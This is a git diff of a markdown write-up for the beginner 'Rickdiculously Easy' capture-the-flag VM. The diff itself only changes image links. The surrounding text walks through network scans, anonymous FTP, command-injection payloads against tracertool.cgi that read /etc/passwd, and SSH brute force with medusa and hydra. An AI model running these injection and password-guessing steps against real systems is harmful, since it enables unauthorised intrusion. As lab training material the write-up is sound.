@@ -18,7 +18,7 @@ It's designed to be a beginner ctf, if you're new to pen testing, check it out!
 ## Finding the IP address of the Vuln Machine
 
 `sudo arp-scan 10.0.0.0/24`
-![67b70bab9487175b405a8df4964f230c.png](:/32a1b37e8b2c47cc8ed70ce1e649487f)
+![Optional Text](/Rickdiculously%20Easy/_resources/32a1b37e8b2c47cc8ed70ce1e649487f.png)
 
 * * *
 
@@ -67,11 +67,11 @@ Service detection performed. Please report any incorrect results at https://nmap
 ### Checking out items from the NAMP scan
 
 I check out the `https://10.0.0.137:9090/` from the nmap scan and I see
-![9fdb9e6c2e1c9ecc7b54b5e4ac8a705a.png](:/28c5f1cc424b4876b5ee99bb7015065d)
+![Optional Text](/Rickdiculously%20Easy/_resources/28c5f1cc424b4876b5ee99bb7015065d.png)
 
 `wget -m ftp://anonymous:anonymous@10.0.0.137`
 
-![55cfceb9709e9b3c295a757a60605ed0.png](:/380d1b0562be4575a485325880fd6713)
+![Optional Text](/Rickdiculously%20Easy/_resources/380d1b0562be4575a485325880fd6713.png)
 
 2 Flags found for 20 points, 110 left to go
 
@@ -82,22 +82,22 @@ I check out the `https://10.0.0.137:9090/` from the nmap scan and I see
 ## Nikto scan results
 
 `nikto -h 10.0.0.137:80`
-![8d45ca4279d10fad5fe95ced8fa46027.png](:/e80a8432e21b47f8bb96a19a801c69a9)
+![Optional Text](/Rickdiculously%20Easy/_resources/e80a8432e21b47f8bb96a19a801c69a9.png)
 
 * * *
 
 Checking Out the /passwords/ dir I see:
-![deb0205ef284a20a4256d50cf77e71da.png](:/583ddbbb5a134746a502bbbdd01d5b6d)
+![Optional Text](/Rickdiculously%20Easy/_resources/583ddbbb5a134746a502bbbdd01d5b6d.png)
 
 * * *
 
 After Clicking on FLAG.txt I see:
-![ae32654f6a0cb80d16e745a3cbf6face.png](:/a149221d696b42239fedfef08d456a1d)
+![Optional Text](/Rickdiculously%20Easy/_resources/a149221d696b42239fedfef08d456a1d.png)
 
 * * *
 
 Clicking on the passwords.html I see:
-![b41ff538ef80253ff03956ab3da71b25.png](:/be61f44dc89b433995b0bdda425d1160)
+![Optional Text](/Rickdiculously%20Easy/_resources/be61f44dc89b433995b0bdda425d1160.png)
 
 **The message**
 
@@ -108,14 +108,14 @@ Wow Morty real clever. Storing passwords in a file called passwords.html? You've
 * * *
 
 Looking at the source of `10.0.0.137/passwords/passwords.html` I see:
-![b23836a0f0fc95e751a88844405a5f0b.png](:/3be9c5f2d8c34c6e8156c476ac324836)
+![Optional Text](/Rickdiculously%20Easy/_resources/3be9c5f2d8c34c6e8156c476ac324836.png)
 
 * * *
 
 Great as of right now we have a password `winter` and 30 points found 100 left to go!
 
 Looking at `http://10.0.0.137/robots.txt` I see:
-![b9ae2007ee33e48730a8a23b5f563e64.png](:/8279bcc2dac9489096951170c9a55b04)
+![Optional Text](/Rickdiculously%20Easy/_resources/8279bcc2dac9489096951170c9a55b04.png)
 
 Looks like another set of directories
 
@@ -127,10 +127,10 @@ Looks like another set of directories
 ```
 
 `10.0.0.137/cgi-bin/root_shell.cgi`
-![6e4d4cf4fb134b229f680fcea8b4a46b.png](:/c1d060c970384b449cadc580c55915b8)
+![Optional Text](/Rickdiculously%20Easy/_resources/c1d060c970384b449cadc580c55915b8.png)
 
 `http://10.0.0.137/cgi-bin/tracertool.cgi`
-![0fdef53696a69c907ed548e97828485f.png](:/9ac3412d75fd4194b063f8a52debd39d)
+![Optional Text](/Rickdiculously%20Easy/_resources/9ac3412d75fd4194b063f8a52debd39d.png)
 
 Looking over everything I found so far I decided to dig into `http://10.0.0.137/cgi-bin/tracertool.cgi` a little further.
 
@@ -144,7 +144,7 @@ So I decided to see if it did
 
 `1.1.1.1;man nc`
 
-![22ffedfbee6d6ef286dab3cea84ba1d0.png](:/9b996bd49cb441eba744c47f1d8e2a53)
+![Optional Text](/Rickdiculously%20Easy/_resources/9b996bd49cb441eba744c47f1d8e2a53.png)
 
 python3 -m http.server 8000
 
@@ -152,7 +152,7 @@ curl http://127.0.0.1:8001/1.txt
 
 :nl /etc/passwd
 
-![104147d13afb9df9892c9fdcd1e186df.png](:/6a8dee2210714497bd66728abccf025e)
+![Optional Text](/Rickdiculously%20Easy/_resources/6a8dee2210714497bd66728abccf025e.png)
 
 Great now we have some usernames
 27 RickSanchez:x:1000:1000::/home/RickSanchez:/bin/bash
@@ -166,7 +166,7 @@ ls /home/Morty
 ## FTP Login
 
 After user creds Summer:winter I was able to get an FTP login
-![d8bfab87683de11e48b63e91086e4310.png](:/33bd2ec1b02544c698bae44d6cef7f85)
+![Optional Text](/Rickdiculously%20Easy/_resources/33bd2ec1b02544c698bae44d6cef7f85.png)
 
 ## You can login using the sequence below
 
@@ -189,9 +189,9 @@ ls /home/Morty
 
 [http://10.0.0.137/cgi-bin/tracertool.cgi?ip=||whoami>/var/www/output.txt||](http://10.0.0.137/cgi-bin/tracertool.cgi?ip=%7C%7Cwhoami%3E/var/www/output.txt%7C%7C)
 
-![b4ce62466cd63eb13e53ff64ef30ebb7.png](:/9cdc677064af42528e30c76533c43823)
+![Optional Text](/Rickdiculously%20Easy/_resources/9cdc677064af42528e30c76533c43823.png)
 
-![1ee1210b9c1009c089eaf8f4aee0fcb5.png](:/1db82e2b853c4415a3f1f55b438e93b0)
+![Optional Text](/Rickdiculously%20Easy/_resources/1db82e2b853c4415a3f1f55b438e93b0.png)
 
 Monday: So today Rick told me huge secret. He had finished his flask and was on to commercial grade paint solvent. He spluttered something about a safe, and a password. Or maybe it was a safe password... Was a password that was safe? Or a password to a safe? Or a safe password to a safe?
 
@@ -205,7 +205,7 @@ Here it is:
 
 ./safe 131333
 
-![9cf1e862b5ba5b220de37040797c0ad7.png](:/a932636ee913450eb6a3bfa08c8ca6fb)
+![Optional Text](/Rickdiculously%20Easy/_resources/a932636ee913450eb6a3bfa08c8ca6fb.png)
 
 
 [Had to do some reading](https://www.rootinstall.com/tutorial/creating-custom-wordlists-using-crunch-utility/)
@@ -221,7 +221,7 @@ Here it is:
 
 medusa -u RickSanchez -P password.txt -h 10.0.0.137 -M ssh -n 22222 -f
 
-![a6ec42efae78cfd94d4437309b37f977.png](:/517dc2facf2a4a9b91a21237171ec7ea)
+![Optional Text](/Rickdiculously%20Easy/_resources/517dc2facf2a4a9b91a21237171ec7ea.png)
 ACCOUNT FOUND: [ssh] Host: 10.0.0.137 User: RickSanchez Password: P7Curtains [SUCCESS]**strong text**
 
 ## !!Optional!!
@@ -229,11 +229,11 @@ I also used cupp.py to generate passwords. Really easy to use tool
 [GitHub For Cupp.py](https://github.com/Mebus/cupp)
 
 run ./cupp.py -i
-![a05e99c0ef0e1de7016ed7f917a536b9.png](:/809a450dc68d431c89b94e25f145b714)
+![Optional Text](/Rickdiculously%20Easy/_resources/809a450dc68d431c89b94e25f145b714.png)
 
 Used hyrdra install of medusa 
 hydra -l RickSanchez -P the.txt 10.0.0.137 -s22222 ssh
 
-![a6ec42efae78cfd94d4437309b37f977.png](:/517dc2facf2a4a9b91a21237171ec7ea)
+![Optional Text](/Rickdiculously%20Easy/_resources/517dc2facf2a4a9b91a21237171ec7ea.png)
 ACCOUNT FOUND: [ssh] Host: 10.0.0.137 User: RickSanchez Password: P7Curtains [SUCCESS]
 
